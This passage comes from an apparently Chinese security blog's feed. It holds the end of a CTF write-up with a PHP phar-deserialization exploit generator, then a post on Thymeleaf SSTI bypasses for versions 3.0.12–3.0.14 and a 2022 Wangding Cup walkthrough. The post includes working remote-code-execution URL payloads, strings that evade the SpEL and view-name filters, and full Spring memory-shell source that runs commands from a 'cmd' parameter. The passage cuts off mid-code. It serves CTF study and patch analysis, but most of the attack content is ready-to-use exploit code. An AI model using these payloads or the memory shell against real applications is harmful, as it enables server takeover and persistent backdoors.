php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$conn</span>-&gt;<span class="hljs-title function_ invoke__">setAttribute</span>(PDO::<span class="hljs-variable constant_">ATTR_DEFAULT_FETCH_MODE</span>,<span class="hljs-number">262152</span>);<br></code></pre></td></tr></table></figure><p>那我们这里就是可以然后数据库返回UserMessage对象，设置filePath的值，再添加一个不存在的属性即可，数据库的结构如下，直接偷gxn大哥的图了</p><p><img src="https://cdn.clown2024.cn/image-20241226214745079.png" alt="image-20241226214745079"></p><p>最后的exp就是gxn大哥的exp</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span>&#123;<br><br>  <span class="hljs-keyword">private</span> <span class="hljs-variable">$conn</span>;<br><br>  <span class="hljs-keyword">private</span> <span class="hljs-variable">$table</span> = <span class="hljs-string">&#x27;users&#x27;</span>;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$id</span>;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&quot;UserMessage&quot;</span>;<br><br>  <span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&quot;aaaa&quot;</span>;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$created_at</span>;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br><br>     <span class="hljs-variable language_">$this</span>-&gt;conn = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PDO_connect</span>();;<br><br>  &#125;<br><br><br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PDO_connect</span></span>&#123;<br><br><br><br>  <span class="hljs-keyword">private</span> <span class="hljs-variable">$pdo</span>;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$con_options</span> = <span class="hljs-keyword">array</span>(<br><br>     <span class="hljs-string">&quot;dsn&quot;</span>=&gt;<span class="hljs-string">&quot;mysql:host=&lt;vps&gt;:3306;dbname=&lt;dbname&gt;;charset=utf8&quot;</span>,<br><br>     <span class="hljs-string">&#x27;host&#x27;</span>=&gt;<span class="hljs-string">&#x27;&lt;vps&gt;&#x27;</span>,<br><br>     <span class="hljs-string">&#x27;port&#x27;</span>=&gt;<span class="hljs-string">&#x27;3306&#x27;</span>,<br><br>     <span class="hljs-string">&#x27;user&#x27;</span>=&gt;<span class="hljs-string">&#x27;joker&#x27;</span>,<br><br>     <span class="hljs-string">&#x27;password&#x27;</span>=&gt;<span class="hljs-string">&#x27;joker&#x27;</span>,<br><br>      <span class="hljs-string">&#x27;charset&#x27;</span>=&gt;<span class="hljs-string">&#x27;utf8&#x27;</span>,<br><br>     <span class="hljs-string">&#x27;options&#x27;</span>=&gt;<span class="hljs-keyword">array</span>(PDO::<span class="hljs-variable constant_">ATTR_DEFAULT_FETCH_MODE</span>=&gt;<span class="hljs-number">262152</span>,<br><br>       PDO::<span class="hljs-variable constant_">ATTR_ERRMODE</span> =&gt; PDO::<span class="hljs-variable constant_">ERRMODE_EXCEPTION</span>)<br><br>  );<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$smt</span>;<br><br>&#125;<br><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();<br><br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;ppppp.phar&quot;</span>); <br><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <br><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;happy.txt&quot;</span>, <span class="hljs-string">&#x27;happy&#x27;</span>); <br><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$a</span>);<br><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><br><span class="hljs-variable">$file_contents</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;ppppp.phar&quot;</span>);<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$file_contents</span>));<br></code></pre></td></tr></table></figure><p>这里buu靶机维护了，本地不太好测，但打法已经很清楚了，就到这吧，学习到了orz</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.cnblogs.com/gxngxngxn/p/18620905">https://www.cnblogs.com/gxngxngxn/p/18620905</a></p><p><a href="https://xz.aliyun.com/t/6699?time__1311=n4+xnD0Dg7KQq0KGQ3DsA3xCwqWqobqxET2oTD">https://xz.aliyun.com/t/6699?time__1311=n4%2BxnD0Dg7KQq0KGQ3DsA3xCwqWqobqxET2oTD</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;2024年最后一次的das，web终于也是没有爆零了，最后一题的1解题看了gxn大哥的wp也是学到新东西了，这里记录一下&lt;/p&gt;
&lt;p&gt;官方wp：&lt;a href=&quot;https://www.yuque.com/chuangfeimeiyigeren/eeii37/oxv3ga</summary>
      
    
    
    
    <category term="wp" scheme="https://clowsman.github.io/categories/wp/"/>
    
    
    <category term="wp" scheme="https://clowsman.github.io/tags/wp/"/>
    
    <category term="ctf" scheme="https://clowsman.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>再看Thymeleaf</title>
    <link href="https://clowsman.github.io/2024/12/14/%E5%86%8D%E7%9C%8BThymeleaf/"/>
    <id>https://clowsman.github.io/2024/12/14/%E5%86%8D%E7%9C%8BThymeleaf/</id>
    <published>2024-12-14T06:40:45.000Z</published>
    <updated>2024-12-14T16:21:39.708Z</updated>
    
    <content type="html"><![CDATA[<p>再来水一篇Thymeleaf的ssti，起因是看到师兄以前出的题目，里面有一点小坑，索引就把Thymeleaf稍微高版本一些的漏洞再记录一下</p><h1 id="thymeleaf高版本利用"><a href="#thymeleaf高版本利用" class="headerlink" title="thymeleaf高版本利用"></a>thymeleaf高版本利用</h1><p>上一篇文章只说了3.0.11版本之前的利用，后几个版本的利用方式发生了变化，记录一下</p><p>thymeleaf和springboot对应的版本</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">SpringBoot     Thymeleaf<br>2.2.0.RELEASE  3.0.11<br>2.4.10         3.0.12<br>2.7.18         3.0.15<br>3.0.8          3.1.1<br>3.2.2          3.1.2<br></code></pre></td></tr></table></figure><h2 id="3012版本利用"><a href="#3-0-12版本利用" class="headerlink" title="3.0.12版本利用"></a>3.0.12版本利用</h2><p>打一下原来的payload看看报错</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">http://localhost:8081/doc/__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22calc.exe%22).getInputStream()).next()%7d__::.x<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241214152746494.png" alt="image-20241214152746494"></p><p>可以看到他识别出了表达式并禁止了表达式执行，我们可以从调用堆栈看到他报错的地方，在SpringRequestUtils.checkViewNameNotInRequest函数里面，这是在ThymeleafView#renderFragment里面新增的处理方法，我们去看看，其源码如下</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">checkViewNameNotInRequest</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String viewName, <span class="hljs-keyword">final</span> HttpServletRequest request)</span> &#123;<br><br>        <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">vn</span> <span class="hljs-operator">=</span> StringUtils.pack(viewName);<br><br>        <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">requestURI</span> <span class="hljs-operator">=</span> StringUtils.pack(UriEscape.unescapeUriPath(request.getRequestURI()));<br><br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">found</span> <span class="hljs-operator">=</span> (requestURI != <span class="hljs-literal">null</span> &amp;&amp; requestURI.contains(vn));<br>        <span class="hljs-keyword">if</span> (!found) &#123;<br>            <span class="hljs-keyword">final</span> Enumeration&lt;String&gt; paramNames = request.getParameterNames();<br>            String[] paramValues;<br>            String paramValue;<br>            <span class="hljs-keyword">while</span> (!found &amp;&amp; paramNames.hasMoreElements()) &#123;<br>                paramValues = request.getParameterValues(paramNames.nextElement());<br>                <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; !found &amp;&amp; i &lt; paramValues.length; i++) &#123;<br>                    paramValue = StringUtils.pack(UriEscape.unescapeUriQueryParam(paramValues[i]));<br>                    <span class="hljs-keyword">if</span> (paramValue.contains(vn)) &#123;<br>                        found = <span class="hljs-literal">true</span>;<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (found) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplateProcessingException</span>(<br>                    <span class="hljs-string">&quot;View name is an executable expression, and it is present in a literal manner in &quot;</span> +<br>                    <span class="hljs-string">&quot;request path or parameters, which is forbidden for security reasons.&quot;</span>);<br>        &#125;<br><br>    &#125;<br></code></pre></td></tr></table></figure><p>我们调试看一下</p><p><img src="https://cdn.clown2024.cn/image-20241214153327162.png" alt="image-20241214153327162"></p><p>这里如果经过处理后的requestURI包含vn，就会在下面抛出异常</p><p><code>StringUtils.pack()</code> 的作用是去掉字符串的空格和 <code>ASCII</code> 码在空格之前的特殊字符，并最后转为小写。然后就是先看 <code>uri</code> 中是否存在 <code>viewName</code> （这一步是为了检查 <code>restful</code> 风格的参数是否包含了 <code>viewName</code> ），然后遍历 <code>url</code> 中的参数（ <code>?key=value</code> 的部分 ）是否包含了 <code>viewName</code> （这一步检查的是普通的参数），如果上述任意其一包含了 <code>vn</code> 就报错。正对应这个方法名，检查 <code>viewName</code> 是否在 <code>request</code> 对象中。</p><p>但是我们这里用的是传路径那个demo导致if判断都没进去就报错了</p><p>所以这种场景下的ssti就被防御住了</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/doc/&#123;document&#125;&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">getDocument</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> String document)</span> &#123;<br>        log.info(<span class="hljs-string">&quot;Retrieving &quot;</span> + document);<br>        <span class="hljs-comment">//returns void, so view name is taken from URI</span><br>    &#125;<br></code></pre></td></tr></table></figure><p>但下面这种拼接的场景还是可以绕过的</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/path&quot;)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">path</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> String lang)</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;user/&quot;</span> + lang + <span class="hljs-string">&quot;/welcome&quot;</span>; <span class="hljs-comment">//template path is tainted</span><br>&#125;<br></code></pre></td></tr></table></figure><p>我们调试来看</p><p><img src="https://cdn.clown2024.cn/image-20241214155011988.png" alt="image-20241214155011988"></p><p>这里的路由就无法包含视图名了，所以我们可以进入到if判断里面</p><p>然后对我们的参数值进行处理，用UriEscape.unescapeUriQueryParam方法</p><p><img src="https://cdn.clown2024.cn/image-20241214155518722.png" alt="image-20241214155518722"></p><p>但经过处理之后依旧是不会包含vn的</p><p><img src="https://cdn.clown2024.cn/image-20241214155957921.png" alt="image-20241214155957921"></p><p>所以checkViewNameNotInRequest就已经绕过了，这种场景并不需要我们改payload，用原来的就可以了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">http://localhost:8081/path?lang=__$%7bT(java.lang.Runtime).getRuntime().exec(%22calc%22).getInputStream()%7d__::.x<br></code></pre></td></tr></table></figure><p>还有另一种拼接的场景</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/doc1/&#123;data&#125;&quot;)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">demo4</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> String data)</span> &#123;<br>    System.out.println(data);<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;clown/&quot;</span> + data;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里的poc是这样的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">http://localhost:8081/doc1/;/__$%7BT(java.lang.Runtime).getRuntime().exec(&quot;calc&quot;)%7D__::<br></code></pre></td></tr></table></figure><p>这里的绕过原理和tomcat的url解析特性相关，目的是为了不能让视图的名字和 path 一致，相关原理这里就不分析了，看看网上的文章就好，绕过的方式除了上面的写法还有下面几种</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">/doc1//<br>/doc1;/<br>/doc1/;/<br></code></pre></td></tr></table></figure><p>该特性也可以用在一些权限绕过上面</p><p>但其实上面的payload还是打不通，我们会遇到这样一个错误</p><p><img src="https://cdn.clown2024.cn/image-20241214162453416.png" alt="image-20241214162453416"></p><p>直接说我们template name不合法了，这是怎么回事呢</p><p>这是因为后面还有新增的 <code>SpringStandardExpressionUtils</code>类 的检查，调用containsSpELInstantiationOrStatic方法检查我们的表达式</p><p><img src="https://cdn.clown2024.cn/image-20241214163751121.png" alt="image-20241214163751121"></p><p>源码如下：</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">containsSpELInstantiationOrStatic</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String expression)</span> &#123;<br><br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">         * Checks whether the expression contains instantiation of objects (&quot;new SomeClass&quot;) or makes use of</span><br><span class="hljs-comment">         * static methods (&quot;T(SomeClass)&quot;) as both are forbidden in certain contexts in restricted mode.</span><br><span class="hljs-comment">         */</span><br><br>        <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">explen</span> <span class="hljs-operator">=</span> expression.length();<br>        <span class="hljs-type">int</span> <span class="hljs-variable">n</span> <span class="hljs-operator">=</span> explen;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">ni</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; <span class="hljs-comment">// index for computing position in the NEW_ARRAY</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">si</span> <span class="hljs-operator">=</span> -<span class="hljs-number">1</span>;<br>        <span class="hljs-type">char</span> c;<br>        <span class="hljs-keyword">while</span> (n-- != <span class="hljs-number">0</span>) &#123;<br><br>            c = expression.charAt(n);<br><br>            <span class="hljs-comment">// When checking for the &quot;new&quot; keyword, we need to identify that it is not a part of a larger</span><br>            <span class="hljs-comment">// identifier, i.e. there is whitespace after it and no character that might be a part of an</span><br>            <span class="hljs-comment">// identifier before it.</span><br>            <span class="hljs-keyword">if</span> (ni &lt; NEW_LEN<br>                    &amp;&amp; c == NEW_ARRAY[ni]<br>                    &amp;&amp; (ni &gt; <span class="hljs-number">0</span> || ((n + <span class="hljs-number">1</span> &lt; explen) &amp;&amp; Character.isWhitespace(expression.charAt(n + <span class="hljs-number">1</span>))))) &#123;<br>                ni++;<br>                <span class="hljs-keyword">if</span> (ni == NEW_LEN &amp;&amp; (n == <span class="hljs-number">0</span> || !Character.isJavaIdentifierPart(expression.charAt(n - <span class="hljs-number">1</span>)))) &#123;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>; <span class="hljs-comment">// we found an object instantiation</span><br>                &#125;<br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (ni &gt; <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-comment">// We &#x27;restart&#x27; the matching counter just in case we had a partial match</span><br>                n += ni;<br>                ni = <span class="hljs-number">0</span>;<br>                <span class="hljs-keyword">if</span> (si &lt; n) &#123;<br>                    <span class="hljs-comment">// This has to be restarted too</span><br>                    si = -<span class="hljs-number">1</span>;<br>                &#125;<br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br><br>            ni = <span class="hljs-number">0</span>;<br><br>            <span class="hljs-keyword">if</span> (c == <span class="hljs-string">&#x27;)&#x27;</span>) &#123;<br>                si = n;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (si &gt; n &amp;&amp; c == <span class="hljs-string">&#x27;(&#x27;</span><br>                        &amp;&amp; ((n - <span class="hljs-number">1</span> &gt;= <span class="hljs-number">0</span>) &amp;&amp; (expression.charAt(n - <span class="hljs-number">1</span>) == <span class="hljs-string">&#x27;T&#x27;</span>))<br>                        &amp;&amp; ((n - <span class="hljs-number">1</span> == <span class="hljs-number">0</span>) || !Character.isJavaIdentifierPart(expression.charAt(n - <span class="hljs-number">2</span>)))) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (si &gt; n &amp;&amp; !(Character.isJavaIdentifierPart(c) || c == <span class="hljs-string">&#x27;.&#x27;</span>)) &#123;<br>                si = -<span class="hljs-number">1</span>;<br>            &#125;<br><br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><br>    &#125;<br></code></pre></td></tr></table></figure><p>其主要逻辑是首先倒序检测是否包含 <code>wen</code>关键字、在<code>(</code>的左边的字符是否是<code>T</code>，如包含，那么认为找到了一个实例化对象，返回<code>true</code>，阻止该表达式的执行。</p><p>因此要绕过这个函数，只要满足三点：</p><ol><li>表达式中不能含有关键字<code>new</code>(因为wen倒叙过来就是new了)</li><li>在<code>(</code>的左边的字符不能是<code>T</code></li><li>不能在<code>T</code>和<code>(</code>中间添加的字符使得原表达式出现问题</li></ol><p>这里在 <code>T</code> 和 <code>(</code> 之间加上空格 <code>%20</code> 就可以绕过，其余还有很多字符都可以。例如换行符 <code>%0a</code> ，制表符 <code>%09</code> 。</p><p>new的绕过可以在new后面加个.也能解析来绕过，或者用前面文章说过的反射来绕过，或者大小写也能绕过</p><p><img src="https://cdn.clown2024.cn/image-20241214170720029.png" alt="image-20241214170720029"></p><h2 id="3014版本利用"><a href="#3-0-14版本利用" class="headerlink" title="3.0.14版本利用"></a>3.0.14版本利用</h2><p>该版本对对<code>T</code>和<code>()</code>中间空字符进行绕过修复，原来的空格%20没法绕过了，可以用反射绕过</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">land=__$&#123;<span class="hljs-string">&#x27;&#x27;</span>.getClass().forName(<span class="hljs-string">&#x27;java.lang.Runtime&#x27;</span>).getMethod(<span class="hljs-string">&#x27;exec&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>.getClass()).invoke(<span class="hljs-string">&#x27;&#x27;</span>.getClass().forName(<span class="hljs-string">&#x27;java.lang.Runtime&#x27;</span>).getMethod(<span class="hljs-string">&#x27;getRuntime&#x27;</span>).invoke(<span class="hljs-literal">null</span>),<span class="hljs-string">&#x27;calc&#x27;</span>)&#125;__::<br></code></pre></td></tr></table></figure><p>该版本还对<code>checkViewNameNotInRequest()</code>检测函数也进行了完善：<br>要求 <code>URI</code> 的值和其 <code>get</code> 参数在 <code>StringUtils.pack()</code> 之后不能出现 <code>$</code> ，<code>*</code> ，<code>#</code> ，<code>@</code> ，<code>~</code> 紧跟 <code>&#123;</code> 的情况。</p><p><img src="https://cdn.clown2024.cn/image-20241214173543160.png" alt="image-20241214173543160"></p><p><img src="https://cdn.clown2024.cn/image-20241214173551685.png" alt="image-20241214173551685"></p><p>绕过思路就是不使用<code>$&#123;&#125;</code>或在<code>$&#123;</code>之间加点字符造成绕过，文章中使用||字符来绕过，原因是Thymeleaf3.0.15.RELEASE版本之前<code>LiteralSubstitutionUtil()</code>函数会置空<code>||</code>字符，具体看看师傅的文章就好了：<a href="https://cn-sec.com/archives/3118198.html">https://cn-sec.com/archives/3118198.html</a></p><p>最后绕过payload加个||即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">lang=__$||&#123;&#x27;&#x27;.getClass().forName(&#x27;java.lang.Runtime&#x27;).getMethod(&#x27;exec&#x27;,&#x27;&#x27;.getClass()).invoke(&#x27;&#x27;.getClass().forName(&#x27;java.lang.Runtime&#x27;).getMethod(&#x27;getRuntime&#x27;).invoke(null),&#x27;open -a calculator.app&#x27;)&#125;__::<br></code></pre></td></tr></table></figure><h2 id="其他版本"><a href="#其他版本" class="headerlink" title="其他版本"></a>其他版本</h2><p>从Thymeleaf3.0.15版本开始到现在最新3.1.2.RELEASE版本，就是针对Html文件利用不停的添加黑名单了，这些就需要自己再去研究了</p><p>师傅的文章中提到最新版本ruoyi使用的Thymeleaf3.0.15也是可以打的，以后有机会看看（</p><h1 id="2022网鼎杯-玄武组findit"><a href="#2022网鼎杯-玄武组-FindIT" class="headerlink" title="[2022网鼎杯 玄武组]FindIT"></a>[2022网鼎杯 玄武组]FindIT</h1><p>因为没有环境就看网上wp梳理一下考点</p><p>该题目的考点如下：<br>1、thymeleaf SSTI 漏洞原理<br>2、thymeleaf SSTI漏洞修复绕过技巧<br>3、Spring内存马编写<br>4、Apache Tomcat 9 url 包含特殊字符，例如 &#x2F;、[]处理与替代</p><p>这题打的是3.0.12的Thymeleaf，就用前面文章说过的内存马就可以直接打了，因为前面copy过来的时候已经是成品了，不过这里参照一下这篇文章看看是怎么构造出来的：<a href="https://xz.aliyun.com/t/11688?time__1311=Cq0xRQKQq7qmqGNDQiiQqPGI3oLfObQWa4D">https://xz.aliyun.com/t/11688?time__1311=Cq0xRQKQq7qmqGNDQiiQqPGI3oLfObQWa4D</a></p><p>先是注入内存马的exp</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.springframework.http.HttpStatus;<br><span class="hljs-keyword">import</span> org.springframework.http.ResponseEntity;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestParam;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.util.Scanner;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SpringRequestMappingMemshell</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">doInject</span><span class="hljs-params">(Object requestMappingHandlerMapping)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">msg</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;inject-start&quot;</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Method</span> <span class="hljs-variable">registerMapping</span> <span class="hljs-operator">=</span> requestMappingHandlerMapping.getClass().getMethod(<span class="hljs-string">&quot;registerMapping&quot;</span>, Object.class, Object.class, Method.class);<br>            registerMapping.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-type">Method</span> <span class="hljs-variable">executeCommand</span> <span class="hljs-operator">=</span> SpringRequestMappingMemshell.class.getDeclaredMethod(<span class="hljs-string">&quot;executeCommand&quot;</span>, String.class);<br>            <span class="hljs-type">PatternsRequestCondition</span> <span class="hljs-variable">patternsRequestCondition</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PatternsRequestCondition</span>(<span class="hljs-string">&quot;/*&quot;</span>);<br>            <span class="hljs-type">RequestMethodsRequestCondition</span> <span class="hljs-variable">methodsRequestCondition</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RequestMethodsRequestCondition</span>();<br>            <span class="hljs-type">RequestMappingInfo</span> <span class="hljs-variable">requestMappingInfo</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RequestMappingInfo</span>(patternsRequestCondition, methodsRequestCondition, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br>            registerMapping.invoke(requestMappingHandlerMapping, requestMappingInfo, <span class="hljs-keyword">new</span> <span class="hljs-title class_">SpringRequestMappingMemshell</span>(), executeCommand);<br>            msg = <span class="hljs-string">&quot;inject-success&quot;</span>;<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>            msg = <span class="hljs-string">&quot;inject-error&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> msg;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> ResponseEntity <span class="hljs-title function_">executeCommand</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(value = &quot;cmd&quot;)</span> String cmd)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">execResult</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>).next();<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResponseEntity</span>(execResult, HttpStatus.OK);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后就是需要加载字节码，这里用的是org.springframework.cglib.core.ReflectUtils#defineClass方法，只要传入 类名、类的字节码字节数组 和 类加载器就可以加载恶意类。</p><p>然后我们需要调用上面写的doInject方法来注入内存马，该方法的参数需要传入bean对象，可以用下面的方式来获取</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">T (org.springframework.web.context.request.RequestContextHolder).currentRequestAttributes().getAttribute(<span class="hljs-string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>,<span class="hljs-number">0</span>).getBean(T (Class).forName(<span class="hljs-string">&quot;org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping&quot;</span>))<br></code></pre></td></tr></table></figure><p>其等效于</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-type">WebApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> (WebApplicationContext) org.springframework.web.context.request.RequestContextHolder.currentRequestAttributes().getAttribute(<span class="hljs-string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-type">RequestMappingHandlerMapping</span> <span class="hljs-variable">requestMappingHandlerMapping</span> <span class="hljs-operator">=</span> context.getBean(Class.forName(<span class="hljs-string">&quot;org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping&quot;</span>));<br></code></pre></td></tr></table></figure><p>最终的payload如下：</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">T (org.springframework.cglib.core.ReflectUtils).defineClass(<span class="hljs-string">&quot;SpringRequestMappingMemshell&quot;</span>,T (org.springframework.util.Base64Utils).decodeFromUrlSafeString(<span class="hljs-string">&quot;SpringRequestMappingMemshell.class的UrlSafebase64编码&quot;</span>),<span class="hljs-keyword">new</span> <span class="hljs-title class_">javax</span>.management.loading.MLet(<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.net.URL[<span class="hljs-number">0</span>],T (java.lang.Thread).currentThread().getContextClassLoader())).doInject(T (org.springframework.web.context.request.RequestContextHolder).currentRequestAttributes().getAttribute(<span class="hljs-string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>,<span class="hljs-number">0</span>).getBean(T (Class).forName(<span class="hljs-string">&quot;org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping&quot;</span>)))<br></code></pre></td></tr></table></figure><p>这里用了decodeFromUrlSafeString方法处理，和Tomcat9对url的特殊字符处理有关，这是因为这题要打的形式是&#x2F;doc&#x2F;payload的形式，payload里面包含了&#x2F;，tomcat会认为这是路径分割符号，导致404，如果编码为%2F就会报400错误</p><p>由于SpringRequestMappingMemshell 编译后的class 文件经过base64后里面可能会有&#x2F; 这个字符，因此要使用<strong>org.springframework.util.Base64Utils.encodeToUrlSafeString</strong> 先将SpringRequestMappingMemshell.class 处理成能够用在url 传输的base64编码。然后再使用<strong>org.springframework.util.Base64Utils.decodeFromUrlSafeString</strong> 进行解码操作。</p><p>转变代码</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-type">byte</span>[] bytes= Files.readAllBytes(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;SpringRequestMappingMemshell.class&quot;</span>).toPath());<br><span 